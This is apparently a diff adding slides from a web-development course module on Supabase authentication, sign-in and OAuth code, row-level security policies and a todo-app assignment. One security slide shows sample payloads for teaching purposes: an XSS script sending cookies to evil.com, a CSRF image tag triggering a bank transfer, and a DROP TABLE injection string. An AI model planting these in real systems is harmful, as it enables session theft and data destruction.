+<pre><span class="keyword">const</span> <span class="function">handleSignIn</span> = <span class="keyword">async</span> (e) => {
+  e.<span class="function">preventDefault</span>();
+  <span class="function">setLoading</span>(<span class="keyword">true</span>);
+  <span class="function">setError</span>(<span class="keyword">null</span>);
+
+  <span class="keyword">const</span> { data, error } = <span class="keyword">await</span> supabase.auth.<span class="function">signInWithPassword</span>({
+    email,
+    password,
+  });
+
+  <span class="keyword">if</span> (error) {
+    <span class="function">setError</span>(error.message);
+  } <span class="keyword">else</span> {
+    <span class="comment">// data.user — the user object</span>
+    <span class="comment">// data.session — JWT + refresh token</span>
+    console.<span class="function">log</span>(<span class="string">'Signed in as:'</span>, data.user.email);
+  }
+
+  <span class="function">setLoading</span>(<span class="keyword">false</span>);
+};</pre>
+                </div>
+                <div class="dark-two-column" style="margin-top: 1rem;">
+                    <div class="dark-card info">
+                        <h4>Session Auto-Stored</h4>
+                        <p>After sign-in, the Supabase client stores the session automatically. All future queries are authenticated.</p>
+                    </div>
+                    <div class="dark-card warning">
+                        <h4>signUp ≠ signIn</h4>
+                        <p>Don't mix them up. signUp creates a new account. signInWithPassword authenticates an existing one.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Slide 16: Sign Out -->
+        <section class="slide" id="sign-out" data-narration="Signing out is the simplest auth operation — it's just one line. supabase.auth.signOut() clears the session from the browser and invalidates the refresh token on the server. After this call, the user is no longer authenticated and any Supabase queries that require authentication will fail. You'll typically wire this up to a 'Sign Out' button in your navigation or header. The method is async, so use await if you need to do something after sign-out completes — like redirecting to a login page. One important detail: signOut only clears the current session. If the user is logged in on multiple devices, those other sessions remain active until their tokens expire. That's normal behavior for JWT-based auth. In your UI, you should update the displayed state after sign-out — either by listening for auth state changes, which we'll cover next, or by manually resetting your component state.">
+            <div class="dark-container">
+                <h2>Sign Out</h2>
+                <p class="subtitle">Clear the user session with <code>supabase.auth.signOut()</code></p>
+                <div class="code-block">
+<pre><span class="keyword">const</span> <span class="function">handleSignOut</span> = <span class="keyword">async</span> () => {
+  <span class="keyword">const</span> { error } = <span class="keyword">await</span> supabase.auth.<span class="function">signOut</span>();
+
+  <span class="keyword">if</span> (error) {
+    console.<span class="function">error</span>(<span class="string">'Error signing out:'</span>, error.message);
+  } <span class="keyword">else</span> {
+    console.<span class="function">log</span>(<span class="string">'Successfully signed out'</span>);
+  }
+};
+
+<span class="comment">// In your JSX:</span>
+<span class="tag">&lt;button</span> <span class="attr">onClick</span>={handleSignOut}<span class="tag">&gt;</span>Sign Out<span class="tag">&lt;/button&gt;</span></pre>
+                </div>
+                <div class="dark-card info" style="margin-top: 1rem;">
+                    <h4>What signOut() Does</h4>
+                    <ul style="margin: 0.5rem 0 0; padding-left: 1.5rem;">
+                        <li>Clears the JWT and refresh token from browser storage</li>
+                        <li>Invalidates the refresh token on the Supabase server</li>
+                        <li>Future Supabase queries will be unauthenticated</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- Slide 17: Getting the Current User -->
+        <section class="slide" id="get-user" data-narration="Knowing who's currently logged in is essential for building your UI. There are two ways to get this information. The first is supabase.auth.getUser(), which makes an API call to Supabase to verify the current session and returns the user object. This is the most reliable method because it validates the token against the server. The second approach — and the one you'll use more often — is onAuthStateChange. This is a listener that fires whenever the authentication state changes: when a user signs in, signs out, or when the token is refreshed. You set it up once, usually in a useEffect hook, and it keeps your app in sync with the auth state. The callback receives an event string — like 'SIGNED_IN', 'SIGNED_OUT', or 'TOKEN_REFRESHED' — and the current session. This pattern is the recommended way to track auth state in React because it's reactive. Instead of constantly checking 'is someone logged in?', the listener tells you when something changes. Don't forget to unsubscribe when the component unmounts — the subscription.unsubscribe() call in the cleanup function prevents memory leaks.">
+            <div class="dark-container">
+                <h2>Getting the Current User</h2>
+                <p class="subtitle">Two ways to check who's logged in — one-time check or reactive listener.</p>
+                <div class="dark-two-column" style="margin-top: 1rem;">
+                    <div>
+                        <h3>One-Time Check</h3>
+                        <div class="code-block">
+<pre><span class="keyword">const</span> { data: { user } } =
+  <span class="keyword">await</span> supabase.auth.<span class="function">getUser</span>();
+
+<span class="keyword">if</span> (user) {
+  console.<span class="function">log</span>(<span class="string">'Logged in:'</span>, user.email);
+} <span class="keyword">else</span> {
+  console.<span class="function">log</span>(<span class="string">'Not logged in'</span>);
+}</pre>
+                        </div>
+                    </div>
+                    <div>
+                        <h3>Reactive Listener ⭐</h3>
+                        <div class="code-block">
+<pre><span class="function">useEffect</span>(() => {
+  <span class="keyword">const</span> { data: { subscription } } =
+    supabase.auth.<span class="function">onAuthStateChange</span>(
+      (event, session) => {
+        <span class="function">setUser</span>(session?.user ?? <span class="keyword">null</span>);
+      }
+    );
+
+  <span class="keyword">return</span> () =>
+    subscription.<span class="function">unsubscribe</span>();
+}, []);</pre>
+                        </div>
+                    </div>
+                </div>
+                <div class="dark-card info" style="margin-top: 1rem;">
+                    <h4>Use onAuthStateChange for React Apps</h4>
+                    <p>It fires on sign-in, sign-out, and token refresh — keeping your UI automatically in sync.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Slide 18: Building a Login Form Component -->
+        <section class="slide" id="login-form" data-narration="Now let's put it all together into a complete, production-quality login form component. This Auth component handles both sign-in and sign-up with a toggle between the two modes. It tracks email, password, loading state, error messages, and whether we're in sign-up or sign-in mode. When the form is submitted, it calls either signUp or signInWithPassword based on the current mode. The form disables the submit button while loading to prevent double-clicks, and displays errors in a visible paragraph so users know what went wrong. The toggle at the bottom lets users switch between 'I need an account' and 'I already have one.' This is a common pattern you'll see in real apps — a single auth page that handles both flows. Notice the pattern: we always clear the error state before making a new request, and we always turn off loading in a finally block or after both branches. These defensive coding patterns prevent stale UI states. You'll use this exact component structure in your assignment.">
+            <div class="dark-container">
+                <h2>Building a Login Form</h2>
+                <p class="subtitle">A complete auth component with sign-up/sign-in toggle, error handling, and loading state.</p>
+                <div class="code-block">
+<pre><span class="keyword">import</span> { useState } <span class="keyword">from</span> <span class="string">'react'</span>;
+<span class="keyword">import</span> { supabase } <span class="keyword">from</span> <span class="string">'./supabaseClient'</span>;
+
+<span class="keyword">function</span> <span class="function">Auth</span>() {
+  <span class="keyword">const</span> [email, setEmail] = <span class="function">useState</span>(<span class="string">''</span>);
+  <span class="keyword">const</span> [password, setPassword] = <span class="function">useState</span>(<span class="string">''</span>);
+  <span class="keyword">const</span> [loading, setLoading] = <span class="function">useState</span>(<span class="keyword">false</span>);
+  <span class="keyword">const</span> [error, setError] = <span class="function">useState</span>(<span class="keyword">null</span>);
+  <span class="keyword">const</span> [isSignUp, setIsSignUp] = <span class="function">useState</span>(<span class="keyword">false</span>);
+
+  <span class="keyword">const</span> <span class="function">handleSubmit</span> = <span class="keyword">async</span> (e) => {
+    e.<span class="function">preventDefault</span>();
+    <span class="function">setLoading</span>(<span class="keyword">true</span>);
+    <span class="function">setError</span>(<span class="keyword">null</span>);
+
+    <span class="keyword">const</span> { error } = isSignUp
+      ? <span class="keyword">await</span> supabase.auth.<span class="function">signUp</span>({ email, password })
+      : <span class="keyword">await</span> supabase.auth.<span class="function">signInWithPassword</span>({ email, password });
+
+    <span class="keyword">if</span> (error) <span class="function">setError</span>(error.message);
+    <span class="function">setLoading</span>(<span class="keyword">false</span>);
+  };
+
+  <span class="keyword">return</span> (
+    <span class="tag">&lt;form</span> <span class="attr">onSubmit</span>={handleSubmit}<span class="tag">&gt;</span>
+      <span class="tag">&lt;h2&gt;</span>{isSignUp ? <span class="string">'Create Account'</span> : <span class="string">'Sign In'</span>}<span class="tag">&lt;/h2&gt;</span>
+      {error &amp;&amp; <span class="tag">&lt;p</span> <span class="attr">style</span>={{ color: <span class="string">'red'</span> }}<span class="tag">&gt;</span>{error}<span class="tag">&lt;/p&gt;</span>}
+      <span class="tag">&lt;input</span> <span class="attr">type</span>=<span class="string">"email"</span> <span class="attr">value</span>={email}
+        <span class="attr">onChange</span>={(e) => <span class="function">setEmail</span>(e.target.value)} <span class="attr">required</span> <span class="tag">/&gt;</span>
+      <span class="tag">&lt;input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">value</span>={password}
+        <span class="attr">onChange</span>={(e) => <span class="function">setPassword</span>(e.target.value)} <span class="attr">required</span> <span class="tag">/&gt;</span>
+      <span class="tag">&lt;button</span> <span class="attr">disabled</span>={loading}<span class="tag">&gt;</span>
+        {loading ? <span class="string">'Loading...'</span> : isSignUp ? <span class="string">'Sign Up'</span> : <span class="string">'Sign In'</span>}
+      <span class="tag">&lt;/button&gt;</span>
+      <span class="tag">&lt;p</span> <span class="attr">onClick</span>={() => <span class="function">setIsSignUp</span>(!isSignUp)}<span class="tag">&gt;</span>
+        {isSignUp ? <span class="string">'Already have an account? Sign In'</span>
+                  : <span class="string">'Need an account? Sign Up'</span>}
+      <span class="tag">&lt;/p&gt;</span>
+    <span class="tag">&lt;/form&gt;</span>
+  );
+}</pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- Slide 19: Protected Routes / Conditional Rendering -->
+        <section class="slide" id="protected-routes" data-narration="Once you have authentication working, the next step is protecting content. There are two main patterns. The simplest is conditional rendering — show different UI depending on whether the user is logged in. Your App component listens for auth state changes and stores the user. If there's no user, show the Auth form. If there is a user, show the protected content — like the todo list. This is the pattern we'll use in the assignment. The other approach, which you'd use in larger apps, is protected routes with React Router. You create a wrapper component that checks if the user is authenticated and either renders the child route or redirects to the login page. For our purposes, conditional rendering is simpler and works great. The key is that the onAuthStateChange listener in the useEffect keeps everything in sync — when someone signs in, the user state updates, and the UI automatically switches from the login form to the protected content. When they sign out, it switches back. No page refresh needed. This reactive pattern is what makes single-page apps feel snappy.">
+            <div class="dark-container">
+                <h2>Protected Routes / Conditional Rendering</h2>
+                <p class="subtitle">Show different UI based on whether the user is logged in.</p>
+                <div class="code-block">
+<pre><span class="keyword">import</span> { useState, useEffect } <span class="keyword">from</span> <span class="string">'react'</span>;
+<span class="keyword">import</span> { supabase } <span class="keyword">from</span> <span class="string">'./supabaseClient'</span>;
+<span class="keyword">import</span> Auth <span class="keyword">from</span> <span class="string">'./Auth'</span>;
+<span class="keyword">import</span> TodoList <span class="keyword">from</span> <span class="string">'./TodoList'</span>;
+
+<span class="keyword">function</span> <span class="function">App</span>() {
+  <span class="keyword">const</span> [user, setUser] = <span class="function">useState</span>(<span class="keyword">null</span>);
+
+  <span class="function">useEffect</span>(() => {
+    <span class="keyword">const</span> { data: { subscription } } =
+      supabase.auth.<span class="function">onAuthStateChange</span>((event, session) => {
+        <span class="function">setUser</span>(session?.user ?? <span class="keyword">null</span>);
+      });
+
+    <span class="keyword">return</span> () => subscription.<span class="function">unsubscribe</span>();
+  }, []);
+
+  <span class="keyword">return</span> (
+    <span class="tag">&lt;div&gt;</span>
+      {user ? (
+        <span class="tag">&lt;&gt;</span>
+          <span class="tag">&lt;p&gt;</span>Welcome, {user.email}<span class="tag">&lt;/p&gt;</span>
+          <span class="tag">&lt;button</span> <span class="attr">onClick</span>={() => supabase.auth.<span class="function">signOut</span>()}<span class="tag">&gt;</span>Sign Out<span class="tag">&lt;/button&gt;</span>
+          <span class="tag">&lt;TodoList /&gt;</span>
+        <span class="tag">&lt;/&gt;</span>
+      ) : (
+        <span class="tag">&lt;Auth /&gt;</span>
+      )}
+    <span class="tag">&lt;/div&gt;</span>
+  );
+}</pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- Slide 20: OAuth with GitHub -->
+        <section class="slide" id="oauth-github" data-narration="OAuth lets users sign in with an existing account from a provider like GitHub, Google, or Apple. Let's set up GitHub OAuth since you all have GitHub accounts from this class. The code is remarkably simple — just one method call: supabase.auth.signInWithOAuth with the provider set to 'github'. When the user clicks the button, Supabase redirects them to GitHub's authorization page. The user approves the request, GitHub redirects back to your app with an authorization code, and Supabase exchanges it for a session. Your user is now logged in without ever creating a password on your site. The setup requires a bit of configuration. On GitHub, go to Settings, then Developer Settings, then OAuth Apps, and create a new app. The authorization callback URL must be your Supabase project's auth callback URL — you'll find it in the Supabase dashboard under Authentication, then Providers, then GitHub. Copy the Client ID and Client Secret from GitHub into the Supabase dashboard, and enable the GitHub provider. You can also pass a redirectTo option to control where the user lands after authenticating. This should be your app's URL, and it must be in your Supabase redirect URL allowlist. OAuth is optional for the assignment, but it's a valuable skill and surprisingly easy to set up with Supabase.">
+            <div class="dark-container">
+                <h2>OAuth with GitHub</h2>
+                <p class="subtitle">Let users sign in with their GitHub account — no password needed.</p>
+                <div class="dark-two-column" style="margin-top: 1rem;">
+                    <div>
+                        <h3>The Code (one line!)</h3>
+                        <div class="code-block">
+<pre><span class="keyword">const</span> <span class="function">handleGitHubLogin</span> = <span class="keyword">async</span> () => {
+  <span class="keyword">const</span> { error } = <span class="keyword">await</span>
+    supabase.auth.<span class="function">signInWithOAuth</span>({
+      provider: <span class="string">'github'</span>,
+      options: {
+        redirectTo:
+          <span class="string">'http://localhost:5173'</span>,
+      },
+    });
+
+  <span class="keyword">if</span> (error)
+    console.<span class="function">error</span>(error.message);
+};
+
+<span class="comment">// Button:</span>
+<span class="tag">&lt;button</span> <span class="attr">onClick</span>={handleGitHubLogin}<span class="tag">&gt;</span>
+  Sign in with GitHub
+<span class="tag">&lt;/button&gt;</span></pre>
+                        </div>
+                    </div>
+                    <div>
+                        <h3>Setup Steps</h3>
+                        <div class="feature-grid" style="grid-template-columns: 1fr; margin-top: 0.5rem;">
+                            <div class="feature-item">
+                                <span class="step-number">1</span>
+                                <div class="feature-text">
+                                    <strong>GitHub OAuth App</strong>
+                                    Settings → Developer Settings → OAuth Apps → New
+                                </div>
+                            </div>
+                            <div class="feature-item">
+                                <span class="step-number">2</span>
+                                <div class="feature-text">
+                                    <strong>Callback URL</strong>
+                                    Set to your Supabase auth callback (found in dashboard)
+                                </div>
+                            </div>
+                            <div class="feature-item">
+                                <span class="step-number">3</span>
+                                <div class="feature-text">
+                                    <strong>Copy Credentials</strong>
+                                    Paste Client ID &amp; Secret into Supabase → Auth → Providers → GitHub
+                                </div>
+                            </div>
+                            <div class="feature-item">
+                                <span class="step-number">4</span>
+                                <div class="feature-text">
+                                    <strong>Enable Provider</strong>
+                                    Toggle GitHub on in Supabase Auth settings
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Slide 21: Row Level Security with Auth -->
+        <section class="slide" id="rls-with-auth" data-narration="This is where authentication and authorization come together beautifully. In Module 7, you learned about Row Level Security. Now we can connect it to authenticated users. The auth.uid() function in a Supabase policy returns the ID of the currently authenticated user — extracted from their JWT. So you can write a policy like 'users can only select rows where user_id equals auth.uid()'. This means even if someone hacks your frontend and tries to query all todos, the database itself enforces that they only get their own data. That's defense in depth — security at the data layer, not just the application layer. First, you'll add a user_id column to your todos table that references auth.users. When inserting a todo, you'll use auth.uid() as the default value so the user's ID is automatically attached. Then create policies: SELECT where user_id matches auth.uid(), INSERT where the same condition holds, and DELETE and UPDATE too. The SQL shown here gives each user complete control over their own todos and zero access to anyone else's. This is real-world security architecture, the same patterns companies like Notion and Linear use in production.">
+            <div class="dark-container">
+                <h2>Row Level Security with Auth</h2>
+                <p class="subtitle">Connect RLS policies to authenticated users — each user only sees their own data.</p>
+                <div class="code-block">
+<pre><span class="comment">-- 1. Add user_id column to your todos table</span>
+<span class="keyword">ALTER TABLE</span> todos
+<span class="keyword">ADD COLUMN</span> user_id uuid <span class="keyword">REFERENCES</span> auth.users(id)
+<span class="keyword">DEFAULT</span> auth.uid();
+
+<span class="comment">-- 2. Enable RLS (if not already)</span>
+<span class="keyword">ALTER TABLE</span> todos <span class="keyword">ENABLE ROW LEVEL SECURITY</span>;
+
+<span class="comment">-- 3. Policy: Users can only SELECT their own todos</span>
+<span class="keyword">CREATE POLICY</span> <span class="string">"Users read own todos"</span>
+<span class="keyword">ON</span> todos <span class="keyword">FOR SELECT</span>
+<span class="keyword">USING</span> (auth.uid() = user_id);
+
+<span class="comment">-- 4. Policy: Users can only INSERT their own todos</span>
+<span class="keyword">CREATE POLICY</span> <span class="string">"Users insert own todos"</span>
+<span class="keyword">ON</span> todos <span class="keyword">FOR INSERT</span>
+<span class="keyword">WITH CHECK</span> (auth.uid() = user_id);
+
+<span class="comment">-- 5. Policy: Users can only DELETE their own todos</span>
+<span class="keyword">CREATE POLICY</span> <span class="string">"Users delete own todos"</span>
+<span class="keyword">ON</span> todos <span class="keyword">FOR DELETE</span>
+<span class="keyword">USING</span> (auth.uid() = user_id);</pre>
+                </div>
+                <div class="dark-card info" style="margin-top: 1rem;">
+                    <h4>auth.uid() = Magic 🔮</h4>
+                    <p>Supabase extracts the user ID from the JWT automatically. Even if someone bypasses your frontend, the database enforces the rules.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ========== Web Security Basics ========== -->
+
+        <!-- Slide 22: Part 2b Title -->
+        <section class="slide title-slide" id="part2b" data-narration="Now that we've covered authentication implementation, let's shift to web security more broadly. Authentication is critical, but it's just one piece of the security puzzle. As developers, you're responsible for protecting your users from a range of threats. We're going to cover the most common web vulnerabilities and the best practices every developer should follow. This isn't meant to be a comprehensive security course — that would take an entire semester. But these are the basics you absolutely need to know before deploying anything to the public internet. Even if you're not a security specialist, being aware of these attack vectors will make you a better developer.">
+            <h1>Web Security Basics</h1>
+            <p class="subtitle">Common Vulnerabilities &amp; Best Practices</p>
+        </section>
+
+        <!-- Slide 23: Common Web Vulnerabilities -->
+        <section class="slide" id="vulnerabilities" data-narration="Let's talk about the three most common web vulnerabilities you need to know about. First, Cross-Site Scripting, or XSS. This is when an attacker injects malicious JavaScript into your site that runs in other users' browsers. Imagine a comment section where someone posts a comment containing a script tag. If your app renders that comment without sanitizing it, the script runs and can steal cookies, redirect users, or modify the page. React actually protects you from most XSS by default because it escapes content in JSX. But if you use dangerouslySetInnerHTML — the name is a warning — you're bypassing that protection. Second, Cross-Site Request Forgery, or CSRF. This is when a malicious site tricks a user's browser into making requests to your site using their credentials. Since cookies are sent automatically with requests, an attacker's page could trigger actions on your site while the user is logged in. Supabase's token-based auth helps mitigate this because tokens aren't sent automatically like cookies. Third, SQL Injection is when an attacker inserts malicious SQL through user input. If you're building raw queries by concatenating strings, someone could type something like 'drop table users' into a form field. Supabase's client library uses parameterized queries, so you're protected as long as you use the API properly and don't write raw SQL with user input. These three are consistently in the OWASP Top 10, and they've caused some of the biggest data breaches in history.">
+            <div class="dark-container">
+                <h2>Common Web Vulnerabilities</h2>
+                <p class="subtitle">The three attacks every web developer must understand.</p>
+                <div class="dark-three-column" style="margin-top: 1.5rem;">
+                    <div class="dark-card danger">
+                        <h4>XSS — Cross-Site Scripting</h4>
+                        <p style="margin-bottom: 0.5rem;">Attacker injects malicious JavaScript that runs in other users' browsers.</p>
+                        <div class="code-block" style="margin-top: 0.5rem;">
+<pre><span class="comment">&lt;!-- Malicious comment --&gt;</span>
+<span class="tag">&lt;script&gt;</span>
+  <span class="function">fetch</span>(<span class="string">'https://evil.com?cookie='</span>
+    + document.cookie);
+<span class="tag">&lt;/script&gt;</span></pre>
+                        </div>
+                        <p style="margin-top: 0.5rem;"><strong style="color: #4ade80;">React helps:</strong> JSX escapes content by default</p>
+                    </div>
+                    <div class="dark-card danger">
+                        <h4>CSRF — Cross-Site Request Forgery</h4>
+                        <p style="margin-bottom: 0.5rem;">Malicious site tricks the browser into making requests using your credentials.</p>
+                        <div class="code-block" style="margin-top: 0.5rem;">
+<pre><span class="comment">&lt;!-- On attacker's site --&gt;</span>
+<span class="tag">&lt;img</span> <span class="attr">src</span>=<span class="string">"https://bank.com
+  /transfer?to=hacker
+  &amp;amount=10000"</span> <span class="tag">/&gt;</span></pre>
+                        </div>
+                        <p style="margin-top: 0.5rem;"><strong style="color: #4ade80;">Token auth helps:</strong> JWTs aren't sent automatically</p>
+                    </div>
+                    <div class="dark-card danger">
+                        <h4>SQL Injection</h4>
+                        <p style="margin-bottom: 0.5rem;">Attacker inserts malicious SQL through user input fields.</p>
+                        <div class="code-block" style="margin-top: 0.5rem;">
+<pre><span class="comment">-- User types this as name:</span>
+<span class="string">'; DROP TABLE users; --</span>
+
+
+
+</pre>
+                        </div>
+                        <p style="margin-top: 0.5rem;"><strong style="color: #4ade80;">Supabase helps:</strong> Uses parameterized queries</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Slide 24: Security Best Practices -->
+        <section class="slide" id="security-best-practices" data-narration="Now that you know what can go wrong, here are the best practices to protect your applications. First, always use HTTPS. Any deployment on Vercel automatically gets HTTPS, so you're covered there. HTTPS encrypts all data in transit, preventing eavesdropping and tampering. Second, validate all input — on the server, not just the client. Client-side validation is a convenience for users; server-side validation is security. Anyone can bypass your React forms with a tool like Postman or curl. Third, never trust the client. This is the golden rule of web security. Any data coming from the browser could be modified. That's why RLS on the database is so important — it's server-side enforcement. Fourth, use environment variables for secrets. Your Supabase URL is fine to expose — it's designed to be public. But API keys for other services, database passwords, and secret keys should never appear in your frontend code. In Vite, only variables prefixed with VITE_ are exposed to the browser, so you have some protection built in. Fifth, configure CORS properly. CORS controls which domains can make requests to your API. Supabase handles this for you, but when you build your own APIs, restrict CORS to only the domains that need access. Finally, keep your dependencies updated. Security vulnerabilities in npm packages are discovered regularly. Run 'npm audit' periodically to check for known issues.">
+            <div class="dark-container">
+                <h2>Security Best Practices</h2>
+                <p class="subtitle">Essential habits for building secure web applications.</p>
+                <div class="feature-grid" style="margin-top: 1.5rem;">
+                    <div class="feature-item">
+                        <span class="feature-icon">🔒</span>
+                        <div class="feature-text">
+                            <strong>Always Use HTTPS</strong>
+                            Encrypts data in transit. Vercel gives you HTTPS automatically. No exceptions.
+                        </div>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✅</span>
+                        <div class="feature-text">
+                            <strong>Validate Input (Server-Side)</strong>
+                            Client validation is UX. Server validation is security. Anyone can bypass forms.
+                        </div>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">🚫</span>
+                        <div class="feature-text">
+                            <strong>Never Trust the Client</strong>
+                            Any browser data can be modified. RLS enforces rules at the database level.
+                        </div>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">🔑</span>
+                        <div class="feature-text">
+                            <strong>Environment Variables for Secrets</strong>
+                            Use <code>import.meta.env.VITE_*</code> in Vite. Never hardcode API keys in source code.
+                        </div>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">🌐</span>
+                        <div class="feature-text">
+                            <strong>Configure CORS Properly</strong>
+                            Restrict which domains can access your API. Supabase handles this for you.
+                        </div>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">📦</span>
+                        <div class="feature-text">
+                            <strong>Keep Dependencies Updated</strong>
+                            Run <code>npm audit</code> regularly. Patch known vulnerabilities promptly.
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Slide 25: Part 2 Summary -->
+        <section class="slide" id="part2-summary" data-narration="Let's recap Part 2. We covered the complete Supabase Auth API: signUp for creating accounts, signInWithPassword for logging in, signOut for clearing sessions, and getUser plus onAuthStateChange for tracking who's logged in. We built a reusable Auth component with sign-up and sign-in modes, error handling, and loading states. We implemented conditional rendering to show different UIs based on auth state, and covered OAuth with GitHub as an alternative to email and password. We connected authentication to Row Level Security so the database enforces per-user data access. Then we covered the three major web vulnerabilities — XSS, CSRF, and SQL injection — and six security best practices every developer should follow. You now have everything you need to build authenticated, secure web applications. The assignment in Part 3 puts all of this into practice.">
+            <div class="dark-container">
+                <h2>Part 2 Summary</h2>
+                <p class="subtitle">Key concepts from Building Auth &amp; Security Basics.</p>
+                <div class="feature-grid" style="margin-top: 1.5rem;">
+                    <div class="feature-item">
+                        <span class="feature-icon">✓</span>
+                        <div class="feature-text">
+                            <strong>Supabase Auth API</strong>
+                            signUp, signInWithPassword, signOut, getUser, onAuthStateChange
+                        </div>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✓</span>
+                        <div class="feature-text">
+                            <strong>Auth Components</strong>
+                            Login form with toggle, error handling, loading states, conditional rendering
+                        </div>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✓</span>
+                        <div class="feature-text">
+                            <strong>RLS + Auth</strong>
+                            auth.uid() in policies ensures users only access their own data
+                        </div>
+                    </div>
+                    <div class="feature-item">
+                        <span class="feature-icon">✓</span>
+                        <div class="feature-text">
+                            <strong>Security Basics</strong>
+                            XSS, CSRF, SQL Injection — plus HTTPS, input validation, env vars, CORS
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ========== PART 3: Assignment ========== -->
+
+        <!-- Slide 26: Part 3 Title -->
+        <section class="slide title-slide" id="part3" data-narration="Part 3 is your assignment. You're going to take the database-powered Todo app from Module 7 and add full authentication to it. This is a real-world scenario — you've built an app that stores data in a database, and now you need to make it multi-user with proper security. Everything you need was covered in Parts 1 and 2. The assignment is worth 50 points and has clear deliverables. Let's look at the requirements.">
+            <h1>Part 3</h1>
+            <p class="subtitle">Assignment</p>
+        </section>
+
+        <!-- Slide 27: Assignment — Add Auth to Your Todo App -->
+        <section class="slide" id="assignment1" data-narration="Your assignment is to add Supabase authentication to the database-powered Todo app you built in Module 7. This is worth 50 points total. Here are the requirements. First, implement sign-up, sign-in, and sign-out functionality using Supabase Auth. Users should be able to create an account, log in, and log out. Second, the todo list should be protected — it should only be visible when a user is logged in. If no one is logged in, show the auth form instead. Third, and this is the key part, each user should only see their own todos. You'll need to add a user_id column to your todos table, create RLS policies using auth.uid(), and make sure inserts automatically attach the user's ID. Fourth, deploy the finished app to Vercel with your environment variables properly configured. You'll need to add your Vercel URL to the Supabase redirect URLs. For your submission, provide three things: your GitHub repository URL, your live Vercel URL, and screenshots showing the sign-up form, the logged-in view with todos, and your Supabase dashboard showing registered users under Authentication, then Users. Use the code from this module as your guide — the Auth component, the conditional rendering pattern, and the RLS policies are all here in the slides. You've got this.">
+            <div class="dark-container">
+                <h2>Assignment: Add Auth to Your Todo App</h2>
+                <p class="subtitle">Extend your Module 7 Todo app with full authentication and per-user data.</p>
+                <div class="dark-two-column" style="margin-top: 1.5rem;">
+                    <div>
+                        <h3>Requirements</h3>
+                        <div class="feature-grid" style="grid-template-columns: 1fr; margin-top: 0.5rem;">
+                            <div class="feature-item">
+                                <span class="step-number">1</span>
+                                <div class="feature-text">
+                                    <strong>Sign Up / Sign In / Sign Out</strong>
+                                    Full auth flow using Supabase Auth with email &amp; password
+                                </div>
+                            </div>
+                            <div class="feature-item">
+                                <span class="step-number">2</span>
+                                <div class="feature-text">
+                                    <strong>Protected Todo List</strong>
+                                    Only visible when logged in. Show auth form when logged out.
+                                </div>
+                            </div>
+                            <div class="feature-item">
+                                <span class="step-number">3</span>
+                                <div class="feature-text">
+                                    <strong>Per-User Todos (RLS)</strong>
+                                    Add user_id column + RLS policies. Each user only sees their own todos.
+                                </div>
+                            </div>
+                            <div class="feature-item">
+                                <span class="step-number">4</span>
+                                <div class="feature-text">
+                                    <strong>Deploy to Vercel</strong>
+                                    Environment variables configured. Add Vercel URL to Supabase redirects.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div>
+                        <h3>Submit</h3>
+                        <div class="dark-card" style="margin-bottom: 1rem;">
+                            <h4>📎 Deliverables</h4>
+                            <ul style="margin: 0.5rem 0 0; padding-left: 1.5rem;">
+                                <li>GitHub repository URL</li>
+                                <li>Live Vercel URL</li>
+                                <li>Screenshots:
+                                    <ul style="padding-left: 1rem; margin-top: 0.25rem;">
+                                        <li>Sign-up / sign-in form</li>
+                                        <li>Logged-in view with todos</li>
+                                        <li>Supabase Auth dashboard showing users</li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="dark-card info">
+                            <h4>💡 Hints</h4>
+                            <p>Use the Auth component from Slide 18. Use the RLS policies from Slide 21. Use conditional rendering from Slide 19.</p>
+                        </div>
+                    </div>
+                </div>
+                <div style="text-align: center; margin-top: 1.5rem;">
+                    <p style="color: #f59e0b; font-size: 1.5rem; font-weight: bold;">50 Points</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Slide 28: Module Complete -->
+        <section class="slide" id="module-complete" data-narration="Congratulations on completing Module 8! You've learned one of the most important skills in web development — how to authenticate users and secure your applications. You now understand the difference between authentication and authorization, how JWTs work, and the various strategies for verifying user identity. You've implemented sign-up, sign-in, and sign-out with Supabase Auth, built a complete auth component in React, and connected authentication to Row Level Security for per-user data access. You also learned about common web vulnerabilities and best practices to protect against them. These aren't just academic concepts — authentication and security are requirements for every production application. The patterns you've learned here will serve you in every web project you build in your career. Good luck on the assignment, and great work getting this far in the course!">
+            <div class="dark-container">
+                <h2>Module 8 Complete! 🔐</h2>
+                <p class="subtitle">You can now build secure, authenticated web applications.</p>
+                <div class="dark-two-column" style="margin-top: 1.5rem;">
+                    <div class="dark-card">
+                        <h4>What You Learned</h4>
+                        <ul style="margin: 0; padding-left: 1.5rem;">
+                            <li>Authentication vs Authorization</li>
+                            <li>JWTs and token-based auth</li>
+                            <li>Supabase Auth (signUp, signIn, signOut)</li>
+                            <li>Auth state management in React</li>
+                            <li>Protected routes / conditional rendering</li>
+                            <li>OAuth with GitHub</li>
+                            <li>RLS policies with auth.uid()</li>
+                            <li>XSS, CSRF, SQL Injection awareness</li>
+                            <li>Security best practices</li>
+                        </ul>
+                    </div>
+                    <div class="dark-card">
+                        <h4>Skills Unlocked</h4>
+                        <p>You can now build apps where:</p>
+                        <ul style="margin: 0.5rem 0 0; padding-left: 1.5rem;">
+                            <li>Users create accounts and log in</li>
+                            <li>Content is protected behind auth</li>
+                            <li>Each user has their own private data</li>
+                            <li>The database enforces security rules</li>
+                            <li>Multiple auth methods are supported</li>
+                        </ul>
